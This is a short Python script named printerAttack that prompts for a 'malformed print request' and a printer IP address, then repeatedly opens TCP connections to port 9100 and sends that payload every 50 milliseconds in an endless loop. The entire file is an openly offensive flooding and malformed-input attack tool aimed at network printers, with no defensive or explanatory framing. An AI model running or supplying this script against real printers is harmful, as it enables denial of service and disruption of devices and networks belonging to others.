from socket import *
from time import sleep


def printerAttack():
    a = input('Please enter malformed print request: ')
    ip = input('Please enter the ip of the printer: ')
    while True:
        try:
            s = socket(AF_INET, SOCK_STREAM)
            try:
                print('sending malformed print request')
                s.connect((ip, 9100))
                ss = s.send(str(a).encode())
                s.close()
                sleep(.05)
            except OSError as e:
                print(e)
                pass
        except KeyboardInterrupt:
            print('Closing connection to printer.')
            s.close()


printerAttack()
